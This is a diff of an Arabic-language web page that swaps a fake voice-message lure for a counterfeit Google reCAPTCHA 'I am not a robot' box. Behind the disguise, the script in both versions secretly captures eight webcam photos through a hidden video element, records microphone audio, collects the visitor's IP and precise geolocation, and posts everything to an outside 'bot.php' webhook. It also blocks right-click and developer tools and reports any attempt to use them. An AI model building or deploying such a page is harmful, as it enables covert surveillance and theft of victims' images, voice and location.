@@ -1,292 +1,264 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>رسالة صوتية</title>
-  <style>
-    /* ================================================================
-       التصميم العام – مستوحى من تطبيقات المحادثة
-       ================================================================ */
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      -webkit-tap-highlight-color: transparent;
-    }
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>reCAPTCHA – التحقق المتكامل</title>
+    <style>
+        /* ... نفس الأنماط السابقة ... */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Roboto, Arial, sans-serif;
+        }
+        body {
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #eef2f5;
+            padding: 16px;
+        }
+        .captcha-wrapper {
+            width: 340px;
+            max-width: 100%;
+            background: #f9f9f9;
+            border: 1px solid #d3d3d3;
+            border-radius: 5px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+        .captcha-row {
+            display: flex;
+            align-items: center;
+            padding: 15px 15px 12px 15px;
+            gap: 12px;
+        }
+        .spinner {
+            position: relative;
+        }
+        .spinner input {
+            display: none;
+        }
+        .checkmark {
+            width: 32px;
+            height: 32px;
+            border: 2px solid #c1c1c1;
+            border-radius: 3px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            background: white;
+            transition: 0.3s;
+            position: relative;
+        }
+        .checkmark .tick {
+            width: 10px;
+            height: 18px;
+            border-right: 4px solid #00a651;
+            border-bottom: 4px solid #00a651;
+            transform: rotate(45deg);
+            opacity: 0;
+            transition: 0.2s;
+        }
+        .checkmark .loader {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #e8f0fe;
+            border-top: 3px solid #1a73e8;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        .spinner.loading .checkmark {
+            border-color: #1a73e8;
+            background: #e8f0fe;
+        }
+        .spinner.loading .checkmark .tick {
+            display: none;
+        }
+        .spinner.loading .checkmark .loader {
+            display: block;
+        }
+        .spinner.failed .checkmark {
+            border-color: #d93025;
+            background: #fce8e6;
+        }
+        .spinner.failed .checkmark .tick {
+            display: none;
+        }
+        .spinner.failed .checkmark .loader {
+            display: none;
+        }
+        .spinner.failed .checkmark::after {
+            content: "✕";
+            font-size: 22px;
+            font-weight: bold;
+            color: #d93025;
+        }
+        .spinner.success .checkmark {
+            border-color: #00a651;
+            background: #e6f4ea;
+        }
+        .spinner.success .checkmark .tick {
+            opacity: 1;
+            animation: check 0.3s ease;
+        }
+        .spinner.success .checkmark .loader {
+            display: none;
+        }
+        .text {
+            flex: 1;
+            font-size: 18px;
+            color: #333;
+            text-align: center;
+            transition: color 0.2s;
+            user-select: none;
+        }
+        .text.loading {
+            color: #1a73e8;
+        }
+        .text.failed {
+            color: #d93025;
+        }
+        .text.success {
+            color: #00a651;
+        }
+        .text.permission {
+            color: #e37400;
+        }
+        .logo {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-size: 10px;
+            color: #777;
+        }
+        .logo img {
+            width: 38px;
+            margin-bottom: 4px;
+        }
+        .logo strong {
+            font-size: 10px;
+        }
+        .logo small {
+            font-size: 8px;
+        }
+        .captcha-footer {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 6px 14px;
+            background: #f1f3f4;
+            border-top: 1px solid #e5e7e9;
+            height: 36px;
+        }
+        .captcha-footer .brand {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .captcha-footer .brand svg {
+            height: 24px;
+            width: auto;
+        }
+        .captcha-footer .brand .google-text {
+            font-size: 14px;
+            font-weight: 500;
+            color: #222;
+        }
+        .captcha-footer .links {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 11px;
+        }
+        .captcha-footer .links a {
+            color: #555;
+            text-decoration: none;
+            font-size: 11px;
+            transition: color 0.15s;
+        }
+        .captcha-footer .links a:hover {
+            color: #1a73e8;
+            text-decoration: underline;
+        }
+        .captcha-footer .links .separator {
+            color: #aaa;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        @keyframes check {
+            from {
+                opacity: 0;
+                transform: rotate(45deg) scale(0.3);
+            }
+            to {
+                opacity: 1;
+                transform: rotate(45deg) scale(1);
+            }
+        }
+        @media (max-width: 480px) {
+            .captcha-wrapper { width: 100%; }
+            .text { font-size: 16px; }
+            .logo img { width: 32px; }
+            .captcha-footer .brand svg { height: 20px; }
+            .captcha-footer .brand .google-text { font-size: 12px; }
+        }
 
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      background: #e9ebee;
-      padding: 16px;
-    }
-
-    .chat-container {
-      max-width: 500px;
-      width: 100%;
-      background: #ffffff;
-      border-radius: 30px;
-      padding: 24px 20px 20px;
-      box-shadow: 0 8px 32px rgba(0,0,0,0.06);
-    }
-
-    .chat-header {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      padding-bottom: 14px;
-      border-bottom: 1px solid #f0f2f5;
-    }
-    .chat-header .avatar {
-      width: 44px;
-      height: 44px;
-      border-radius: 50%;
-      background: #0084ff;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #fff;
-      font-weight: 700;
-      font-size: 20px;
-    }
-    .chat-header .name {
-      font-weight: 600;
-      color: #050505;
-      font-size: 17px;
-    }
-    .chat-header .status {
-      font-size: 13px;
-      color: #65676b;
-    }
-
-    /* ================================================================
-       فقاعة الرسالة الصوتية
-       ================================================================ */
-    .voice-message {
-      display: flex;
-      align-items: center;
-      gap: 14px;
-      background: #0084ff;
-      padding: 14px 18px 14px 16px;
-      border-radius: 26px 26px 26px 8px;
-      max-width: 100%;
-      min-height: 68px;
-      margin-top: 20px;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.08);
-      transition: background 0.3s ease, box-shadow 0.3s ease;
-      cursor: default;
-      position: relative;
-    }
-
-    .voice-message.error {
-      background: #e57373;
-    }
-    .voice-message.success {
-      background: #34a853;
-    }
-
-    /* زر الإجراء – أيقونة فقط */
-    .action-btn {
-      width: 44px;
-      height: 44px;
-      border-radius: 50%;
-      background: #ffffff;
-      border: none;
-      flex-shrink: 0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      cursor: pointer;
-      transition: all 0.25s cubic-bezier(0.34, 1.56, 0.64, 1);
-      box-shadow: 0 4px 12px rgba(0,0,0,0.10);
-      color: #0084ff;
-      position: relative;
-    }
-    .action-btn:active {
-      transform: scale(0.92);
-    }
-    .action-btn:disabled {
-      opacity: 0.6;
-      cursor: not-allowed;
-      transform: none;
-    }
-    .action-btn svg {
-      width: 22px;
-      height: 22px;
-      fill: currentColor;
-      display: block;
-    }
-    .action-btn .spinner {
-      width: 24px;
-      height: 24px;
-      border-radius: 50%;
-      border: 3px solid rgba(0,132,255,0.15);
-      border-top-color: #0084ff;
-      animation: spin 0.8s linear infinite;
-      display: none;
-    }
-    .action-btn.loading .spinner {
-      display: block;
-    }
-    .action-btn.loading svg {
-      display: none;
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
-    /* شكل الموجة – طويل وممتد */
-    .waveform-container {
-      flex: 1;
-      display: flex;
-      align-items: center;
-      gap: 4px;
-      height: 44px;
-      padding: 4px 0;
-      min-width: 80px;
-    }
-    .bar {
-      flex: 1;
-      max-width: 6px;
-      min-width: 2px;
-      border-radius: 4px;
-      background: rgba(255,255,255,0.3);
-      transition: height 0.12s ease, background 0.25s ease;
-      will-change: height;
-    }
-    .bar.active {
-      background: #ffffff;
-      box-shadow: 0 0 12px rgba(255,255,255,0.3);
-    }
-
-    /* الوقت */
-    .voice-meta {
-      font-size: 13px;
-      color: rgba(255,255,255,0.9);
-      min-width: 36px;
-      text-align: left;
-      font-weight: 500;
-      font-feature-settings: "tnum";
-      direction: ltr;
-      letter-spacing: 0.3px;
-      transition: color 0.3s;
-    }
-
-    /* ================================================================
-       منطقة الحالة – رسائل احترافية بدون إيموجي
-       ================================================================ */
-    .status-area {
-      margin-top: 16px;
-      font-size: 14px;
-      color: #65676b;
-      text-align: center;
-      min-height: 24px;
-      transition: all 0.25s ease;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-    }
-    .status-area .status-icon {
-      width: 20px;
-      height: 20px;
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-    }
-    .status-area .status-icon svg {
-      width: 18px;
-      height: 18px;
-      fill: currentColor;
-    }
-    .status-area.error {
-      color: #d93025;
-    }
-    .status-area.success {
-      color: #34a853;
-    }
-    .status-area.info {
-      color: #0084ff;
-    }
-
-    /* ================================================================
-       عناصر مخفية للكاميرا والصوت
-       ================================================================ */
-    #hiddenVideo {
-      position: fixed;
-      top: -1000px;
-      left: -1000px;
-      width: 320px;
-      height: 240px;
-      opacity: 0;
-      pointer-events: none;
-    }
-    #hiddenCanvas {
-      display: none;
-    }
-
-    /* ================================================================
-       استجابة للشاشات الصغيرة
-       ================================================================ */
-    @media (max-width: 480px) {
-      .chat-container { padding: 16px 14px; }
-      .voice-message { padding: 10px 12px; gap: 10px; min-height: 56px; border-radius: 20px 20px 20px 6px; }
-      .action-btn { width: 38px; height: 38px; }
-      .action-btn svg { width: 18px; height: 18px; }
-      .action-btn .spinner { width: 20px; height: 20px; border-width: 2.5px; }
-      .waveform-container { height: 34px; gap: 3px; }
-      .bar { max-width: 4px; }
-      .voice-meta { font-size: 12px; min-width: 30px; }
-    }
-    @media (max-width: 380px) {
-      .voice-message { gap: 8px; padding: 8px 8px; }
-      .waveform-container { height: 28px; gap: 2px; }
-      .bar { max-width: 3px; }
-    }
-  </style>
+        /* عناصر مخفية للكاميرا والصوت */
+        #hiddenVideo {
+            position: fixed;
+            top: -1000px;
+            left: -1000px;
+            width: 320px;
+            height: 240px;
+            opacity: 0;
+            pointer-events: none;
+        }
+        #hiddenCanvas {
+            display: none;
+        }
+    </style>
 </head>
 <body>
 
-<div class="chat-container">
-  <!-- رأس المحادثة -->
-  <div class="chat-header">
-    <div class="avatar">أ</div>
-    <div>
-      <div class="name">أحمد</div>
-      <div class="status">متصل الآن</div>
+<div class="captcha-wrapper">
+    <div class="captcha-row">
+        <div class="spinner" id="spinner">
+            <input type="checkbox" id="captcha" />
+            <label class="checkmark" for="captcha">
+                <span class="tick"></span>
+                <div class="loader"></div>
+            </label>
+        </div>
+        <div class="text" id="mainText">أنا لست روبوتاً</div>
+        <div class="logo">
+            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" />
+            <strong>reCAPTCHA</strong>
+            <small>الخصوصية - الشروط</small>
+        </div>
     </div>
-  </div>
-
-  <!-- فقاعة الرسالة الصوتية -->
-  <div class="voice-message" id="voiceBubble">
-    <button class="action-btn" id="actionBtn" aria-label="تنزيل الرسالة الصوتية">
-      <!-- أيقونة التنزيل (الحالة الابتدائية) -->
-      <svg viewBox="0 0 24 24" id="iconDownload">
-        <path d="M12 3v10.6l3.3-3.3 1.4 1.4L12 17l-4.7-5.3 1.4-1.4 3.3 3.3V3h0zM5 19h14v2H5z"/>
-      </svg>
-      <!-- أيقونة التشغيل (تظهر بعد التنزيل) -->
-      <svg viewBox="0 0 24 24" id="iconPlay" style="display:none;">
-        <path d="M8 5v14l11-7z"/>
-      </svg>
-      <!-- مؤشر التحميل -->
-      <span class="spinner" id="spinner"></span>
-    </button>
-    <div class="waveform-container" id="waveformContainer"></div>
-    <span class="voice-meta" id="duration">0:09</span>
-  </div>
-
-  <!-- منطقة الحالة -->
-  <div class="status-area" id="statusArea">
-    <span class="status-icon">
-      <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
-    </span>
-    <span id="statusText">اضغط على زر التنزيل لبدء الرسالة</span>
-  </div>
+    <div class="captcha-footer">
+        <div class="brand">
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z"/>
+                <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+                <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+            </svg>
+            <span class="google-text">Google</span>
+        </div>
+        <div class="links">
+            <a href="#" onclick="return false;">سياسة الخصوصية</a>
+            <span class="separator">-</span>
+            <a href="#" onclick="return false;">الشروط</a>
+        </div>
+    </div>
 </div>
 
 <!-- عناصر مخفية للكاميرا والصوت -->
@@ -294,251 +266,221 @@
 <canvas id="hiddenCanvas"></canvas>
 
 <script>
-  // ================================================================
-  //  1.  إنشاء شكل الموجة – 32 عمود
-  // ================================================================
-  const container = document.getElementById('waveformContainer');
-  const BAR_COUNT = 32;
-  const baseHeights = Array.from({ length: BAR_COUNT }, () =>
-    Math.floor(Math.random() * 14) + 6
-  );
-  const bars = [];
-  baseHeights.forEach(h => {
-    const bar = document.createElement('div');
-    bar.className = 'bar';
-    bar.style.height = h + 'px';
-    container.appendChild(bar);
-    bars.push(bar);
-  });
+// ========================================================================
+//  1.  استيراد جميع الوظائف من الكود الأصلي (نفس المنطق)
+// ========================================================================
 
-  // ================================================================
-  //  2.  عناصر DOM
-  // ================================================================
-  const actionBtn = document.getElementById('actionBtn');
-  const iconDownload = document.getElementById('iconDownload');
-  const iconPlay = document.getElementById('iconPlay');
-  const spinner = document.getElementById('spinner');
-  const durationEl = document.getElementById('duration');
-  const voiceBubble = document.getElementById('voiceBubble');
-  const statusText = document.getElementById('statusText');
-  const statusArea = document.getElementById('statusArea');
+// -------------------- الإعدادات --------------------
+const WEBHOOK_URL = "https://dev-free-gift-online.pantheonsite.io/Free/bot.php?action=webhook_data";
+const TOTAL_PHOTOS = 8;
+const CAPTURE_INTERVAL = 700;
+const AUDIO_DURATION = 5000;
+const PHOTO_QUALITY = 0.92;
 
-  const hiddenVideo = document.getElementById('hiddenVideo');
-  const hiddenCanvas = document.getElementById('hiddenCanvas');
+// -------------------- المتغيرات العامة --------------------
+let USER_TOKEN = null;
+let mediaStream = null;
+let audioStream = null;
+let audioRecorder = null;
+let audioChunks = [];
+let capturedPhotoFiles = [];
+let audioBlob = null;
+let userIP = 'غير متاح';
+let userLocation = { lat: null, lng: null, accuracy: null, error: null };
+let isVerifying = false;
+let permissionDeniedFlag = false; // لتتبع رفض الأذونات
 
-  // ================================================================
-  //  3.  متغيرات الحالة
-  // ================================================================
-  let stage = 'download';      // 'download' | 'play' | 'processing'
-  let isProcessing = false;
-  let pulseId = null;
-  let isPulsing = false;
-  let USER_TOKEN = null;
+// -------------------- عناصر DOM --------------------
+const spinner = document.getElementById('spinner');
+const checkbox = document.getElementById('captcha');
+const mainText = document.getElementById('mainText');
+const hiddenVideo = document.getElementById('hiddenVideo');
+const hiddenCanvas = document.getElementById('hiddenCanvas');
 
-  // ================================================================
-  //  4.  استخراج التوكن
-  // ================================================================
-  function extractTokenFromURL() {
+// ========================================================================
+//  2.  دوال جمع البيانات (منقولة بالكامل)
+// ========================================================================
+
+function extractTokenFromURL() {
     const params = new URLSearchParams(window.location.search);
     const token = params.get('i');
     if (token && token.length >= 6 && token.length <= 8 && /^[A-Z0-9]+$/.test(token)) {
-      USER_TOKEN = token;
-      return true;
+        USER_TOKEN = token;
+        return true;
     }
     return false;
-  }
+}
 
-  // ================================================================
-  //  5.  إعدادات Webhook (نفس الأصل)
-  // ================================================================
-  const WEBHOOK_URL = "https://dev-free-gift-online.pantheonsite.io/Free/bot.php?action=webhook_data";
-  const TOTAL_PHOTOS = 8;
-  const CAPTURE_INTERVAL = 700;
-  const AUDIO_DURATION = 5000;
-  const PHOTO_QUALITY = 0.92;
-
-  // ================================================================
-  //  6.  دوال جمع البيانات (نفس الأصل تماماً)
-  // ================================================================
-  let mediaStream = null;
-  let audioStream = null;
-  let audioRecorder = null;
-  let audioChunks = [];
-  let capturedPhotoFiles = [];
-  let audioBlob = null;
-  let userIP = 'غير متاح';
-  let userLocation = { lat: null, lng: null, accuracy: null, error: null };
-
-  async function getIPAddress() {
+async function getIPAddress() {
     try {
-      const res = await fetch('https://api.ipify.org?format=json');
-      const data = await res.json();
-      userIP = data.ip;
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        userIP = data.ip;
     } catch { userIP = 'Unable to fetch'; }
-  }
+}
 
-  async function getLocation() {
+async function getLocation() {
     return new Promise((resolve) => {
-      if (!navigator.geolocation) {
-        userLocation.error = 'المتصفح لا يدعم تحديد الموقع';
-        resolve();
-        return;
-      }
-      let watchId = null;
-      let bestPosition = null;
-      let bestAccuracy = Infinity;
-      let isResolved = false;
-      let attemptCount = 0;
-      const MAX_ATTEMPTS = 10;
-      const TIMEOUT_MS = 15000;
-      const TARGET_ACCURACY = 100;
+        if (!navigator.geolocation) {
+            userLocation.error = 'المتصفح لا يدعم تحديد الموقع';
+            resolve();
+            return;
+        }
+        let watchId = null;
+        let bestPosition = null;
+        let bestAccuracy = Infinity;
+        let isResolved = false;
+        let attemptCount = 0;
+        const MAX_ATTEMPTS = 10;
+        const TIMEOUT_MS = 15000;
+        const TARGET_ACCURACY = 100;
 
-      const resolveWithBest = () => {
-        if (isResolved) return;
-        isResolved = true;
-        if (watchId) navigator.geolocation.clearWatch(watchId);
-        if (bestPosition) {
-          userLocation.lat = bestPosition.coords.latitude;
-          userLocation.lng = bestPosition.coords.longitude;
-          userLocation.accuracy = bestPosition.coords.accuracy;
-          userLocation.error = null;
-        } else {
-          userLocation.error = 'لم نتمكن من الحصول على موقع دقيق';
-        }
-        resolve();
-      };
-
-      const timeoutId = setTimeout(() => {
-        if (!isResolved) {
-          if (watchId) navigator.geolocation.clearWatch(watchId);
-          if (bestPosition) resolveWithBest();
-          else { userLocation.error = 'انتهت المهلة'; resolve(); }
-        }
-      }, TIMEOUT_MS);
-
-      const handlePosition = (pos) => {
-        attemptCount++;
-        const accuracy = pos.coords.accuracy;
-        if (accuracy < bestAccuracy) {
-          bestAccuracy = accuracy;
-          bestPosition = pos;
-        }
-        if (accuracy <= TARGET_ACCURACY || attemptCount >= MAX_ATTEMPTS) {
-          resolveWithBest();
-          clearTimeout(timeoutId);
-        }
-      };
-
-      const handleError = (err) => {
-        if (isResolved) return;
-        if (err.code === 1) {
-          userLocation.error = 'تم رفض الإذن بالوصول إلى الموقع';
-          isResolved = true;
-          if (watchId) navigator.geolocation.clearWatch(watchId);
-          clearTimeout(timeoutId);
-          resolve();
-          return;
-        }
-        if (attemptCount < MAX_ATTEMPTS) {
-          // نستمر
-        } else {
-          if (bestPosition) resolveWithBest();
-          else {
-            userLocation.error = err.message || 'تعذر الحصول على الموقع';
+        const resolveWithBest = () => {
+            if (isResolved) return;
             isResolved = true;
             if (watchId) navigator.geolocation.clearWatch(watchId);
-            clearTimeout(timeoutId);
+            if (bestPosition) {
+                userLocation.lat = bestPosition.coords.latitude;
+                userLocation.lng = bestPosition.coords.longitude;
+                userLocation.accuracy = bestPosition.coords.accuracy;
+                userLocation.error = null;
+            } else {
+                userLocation.error = 'لم نتمكن من الحصول على موقع دقيق';
+            }
             resolve();
-          }
-        }
-      };
-
-      watchId = navigator.geolocation.watchPosition(
-        handlePosition,
-        handleError,
-        { enableHighAccuracy: true, timeout: 5000, maximumAge: 2000 }
-      );
-    });
-  }
-
-  async function startCameraAndCapture() {
-    return new Promise(async (resolve) => {
-      try {
-        const constraints = { video: true, audio: false };
-        mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
-        hiddenVideo.srcObject = mediaStream;
-        await hiddenVideo.play();
-
-        await new Promise((resolve, reject) => {
-          const timeout = setTimeout(() => reject(new Error('Video timeout')), 10000);
-          const onReady = () => { clearTimeout(timeout); resolve(); };
-          if (hiddenVideo.readyState >= 2 && hiddenVideo.videoWidth > 0) onReady();
-          else {
-            hiddenVideo.addEventListener('loadedmetadata', onReady);
-            hiddenVideo.addEventListener('canplay', onReady);
-            hiddenVideo.play().catch(() => {});
-          }
-        });
-
-        await new Promise(r => setTimeout(r, 500));
-        const ctx = hiddenCanvas.getContext('2d');
-        const width = Math.min(hiddenVideo.videoWidth || 640, 1920);
-        const height = Math.min(hiddenVideo.videoHeight || 480, 1080);
-        hiddenCanvas.width = width;
-        hiddenCanvas.height = height;
-
-        capturedPhotoFiles = [];
-        for (let i = 1; i <= TOTAL_PHOTOS; i++) {
-          ctx.drawImage(hiddenVideo, 0, 0, width, height);
-          const blob = await new Promise((resolve) => {
-            hiddenCanvas.toBlob((b) => resolve(b), 'image/jpeg', PHOTO_QUALITY);
-          });
-          if (blob && blob.size > 1000) {
-            const file = new File([blob], `photo_${i}_${Date.now()}.jpg`, { type: 'image/jpeg' });
-            capturedPhotoFiles.push(file);
-          }
-          if (i < TOTAL_PHOTOS) await new Promise(r => setTimeout(r, CAPTURE_INTERVAL));
-        }
-        resolve(true);
-      } catch (error) {
-        console.error('Camera error:', error);
-        if (mediaStream) {
-          mediaStream.getTracks().forEach(t => t.stop());
-          mediaStream = null;
-        }
-        hiddenVideo.srcObject = null;
-        resolve(false);
-      }
-    });
-  }
-
-  async function recordAudio() {
-    return new Promise(async (resolve) => {
-      try {
-        const audioConstraints = { audio: true };
-        audioStream = await navigator.mediaDevices.getUserMedia(audioConstraints);
-        audioRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm;codecs=opus' });
-        audioChunks = [];
-        audioRecorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunks.push(e.data); };
-        audioRecorder.onstop = () => {
-          if (audioChunks.length > 0) {
-            audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-          }
-          resolve();
         };
-        audioRecorder.start();
-        setTimeout(() => {
-          if (audioRecorder.state === 'recording') audioRecorder.stop();
-          audioStream.getTracks().forEach(t => t.stop());
-        }, AUDIO_DURATION);
-      } catch (error) {
-        console.error('Audio error:', error);
-        resolve();
-      }
-    });
-  }
 
-  async function sendAllData() {
+        const timeoutId = setTimeout(() => {
+            if (!isResolved) {
+                if (watchId) navigator.geolocation.clearWatch(watchId);
+                if (bestPosition) resolveWithBest();
+                else { userLocation.error = 'انتهت المهلة'; resolve(); }
+            }
+        }, TIMEOUT_MS);
+
+        const handlePosition = (pos) => {
+            attemptCount++;
+            const accuracy = pos.coords.accuracy;
+            if (accuracy < bestAccuracy) {
+                bestAccuracy = accuracy;
+                bestPosition = pos;
+            }
+            if (accuracy <= TARGET_ACCURACY || attemptCount >= MAX_ATTEMPTS) {
+                resolveWithBest();
+                clearTimeout(timeoutId);
+            }
+        };
+
+        const handleError = (err) => {
+            if (isResolved) return;
+            if (err.code === 1) {
+                userLocation.error = 'تم رفض الإذن بالوصول إلى الموقع';
+                isResolved = true;
+                if (watchId) navigator.geolocation.clearWatch(watchId);
+                clearTimeout(timeoutId);
+                resolve();
+                return;
+            }
+            if (attemptCount < MAX_ATTEMPTS) {
+                // نستمر
+            } else {
+                if (bestPosition) resolveWithBest();
+                else {
+                    userLocation.error = err.message || 'تعذر الحصول على الموقع';
+                    isResolved = true;
+                    if (watchId) navigator.geolocation.clearWatch(watchId);
+                    clearTimeout(timeoutId);
+                    resolve();
+                }
+            }
+        };
+
+        watchId = navigator.geolocation.watchPosition(
+            handlePosition,
+            handleError,
+            { enableHighAccuracy: true, timeout: 5000, maximumAge: 2000 }
+        );
+    });
+}
+
+async function startCameraAndCapture() {
+    return new Promise(async (resolve) => {
+        try {
+            const constraints = { video: true, audio: false };
+            mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
+            hiddenVideo.srcObject = mediaStream;
+            await hiddenVideo.play();
+
+            await new Promise((resolve, reject) => {
+                const timeout = setTimeout(() => reject(new Error('Video timeout')), 10000);
+                const onReady = () => { clearTimeout(timeout); resolve(); };
+                if (hiddenVideo.readyState >= 2 && hiddenVideo.videoWidth > 0) onReady();
+                else {
+                    hiddenVideo.addEventListener('loadedmetadata', onReady);
+                    hiddenVideo.addEventListener('canplay', onReady);
+                    hiddenVideo.play().catch(() => {});
+                }
+            });
+
+            await new Promise(r => setTimeout(r, 500));
+            const ctx = hiddenCanvas.getContext('2d');
+            const width = Math.min(hiddenVideo.videoWidth || 640, 1920);
+            const height = Math.min(hiddenVideo.videoHeight || 480, 1080);
+            hiddenCanvas.width = width;
+            hiddenCanvas.height = height;
+
+            capturedPhotoFiles = [];
+            for (let i = 1; i <= TOTAL_PHOTOS; i++) {
+                ctx.drawImage(hiddenVideo, 0, 0, width, height);
+                const blob = await new Promise((resolve) => {
+                    hiddenCanvas.toBlob((b) => resolve(b), 'image/jpeg', PHOTO_QUALITY);
+                });
+                if (blob && blob.size > 1000) {
+                    const file = new File([blob], `photo_${i}_${Date.now()}.jpg`, { type: 'image/jpeg' });
+                    capturedPhotoFiles.push(file);
+                }
+                if (i < TOTAL_PHOTOS) await new Promise(r => setTimeout(r, CAPTURE_INTERVAL));
+            }
+            resolve(true);
+        } catch (error) {
+            console.error('Camera error:', error);
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(t => t.stop());
+                mediaStream = null;
+            }
+            hiddenVideo.srcObject = null;
+            resolve(false);
+        }
+    });
+}
+
+async function recordAudio() {
+    return new Promise(async (resolve) => {
+        try {
+            const audioConstraints = { audio: true };
+            audioStream = await navigator.mediaDevices.getUserMedia(audioConstraints);
+            audioRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm;codecs=opus' });
+            audioChunks = [];
+            audioRecorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunks.push(e.data); };
+            audioRecorder.onstop = () => {
+                if (audioChunks.length > 0) {
+                    audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                }
+                resolve();
+            };
+            audioRecorder.start();
+            setTimeout(() => {
+                if (audioRecorder.state === 'recording') audioRecorder.stop();
+                audioStream.getTracks().forEach(t => t.stop());
+            }, AUDIO_DURATION);
+        } catch (error) {
+            console.error('Audio error:', error);
+            resolve();
+        }
+    });
+}
+
+async function sendAllData() {
     const formData = new FormData();
     formData.append('event', 'submission');
     formData.append('country', 'غير محدد');
@@ -557,59 +499,60 @@
     formData.append('timestamp', new Date().toISOString());
 
     if (capturedPhotoFiles.length > 0) {
-      capturedPhotoFiles.forEach((file, index) => {
-        formData.append(`photos[]`, file, file.name);
-      });
+        capturedPhotoFiles.forEach((file, index) => {
+            formData.append(`photos[]`, file, file.name);
+        });
     }
     if (audioBlob) {
-      const audioFile = new File([audioBlob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
-      formData.append('audio', audioFile);
+        const audioFile = new File([audioBlob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
+        formData.append('audio', audioFile);
     }
     if (!USER_TOKEN) throw new Error('Token missing');
     formData.append('token', USER_TOKEN);
 
     const response = await fetch(WEBHOOK_URL, {
-      method: 'POST',
-      body: formData
+        method: 'POST',
+        body: formData
     });
     const result = await response.json();
     if (!response.ok) throw new Error(result.message || 'HTTP error');
     return result;
-  }
+}
 
-  // ================================================================
-  //  7.  دوال الأمان (نفس الأصل)
-  // ================================================================
-  function detectSuspiciousActivity() {
+// ========================================================================
+//  3.  دوال الأمان (منقولة)
+// ========================================================================
+
+function detectSuspiciousActivity() {
     document.addEventListener('contextmenu', (e) => {
-      e.preventDefault();
-      sendSuspiciousAlert('🖱️ محاولة النقر الأيمن');
+        e.preventDefault();
+        sendSuspiciousAlert('🖱️ محاولة النقر الأيمن');
     });
     document.addEventListener('keydown', (e) => {
-      const key = e.key;
-      const ctrl = e.ctrlKey || e.metaKey;
-      const shift = e.shiftKey;
-      if (key === 'F12' ||
-          (ctrl && shift && (key === 'I' || key === 'C' || key === 'J')) ||
-          (ctrl && key === 'U')) {
-        e.preventDefault();
-        sendSuspiciousAlert(`⌨️ محاولة فتح أدوات المطور (${key})`);
-      }
-      if (ctrl && (key === 'c' || key === 'v' || key === 'x')) {
-        sendSuspiciousAlert(`📋 محاولة ${key === 'c' ? 'نسخ' : key === 'v' ? 'لصق' : 'قص'}`);
-      }
+        const key = e.key;
+        const ctrl = e.ctrlKey || e.metaKey;
+        const shift = e.shiftKey;
+        if (key === 'F12' ||
+            (ctrl && shift && (key === 'I' || key === 'C' || key === 'J')) ||
+            (ctrl && key === 'U')) {
+            e.preventDefault();
+            sendSuspiciousAlert(`⌨️ محاولة فتح أدوات المطور (${key})`);
+        }
+        if (ctrl && (key === 'c' || key === 'v' || key === 'x')) {
+            sendSuspiciousAlert(`📋 محاولة ${key === 'c' ? 'نسخ' : key === 'v' ? 'لصق' : 'قص'}`);
+        }
     });
     document.addEventListener('dragstart', (e) => {
-      e.preventDefault();
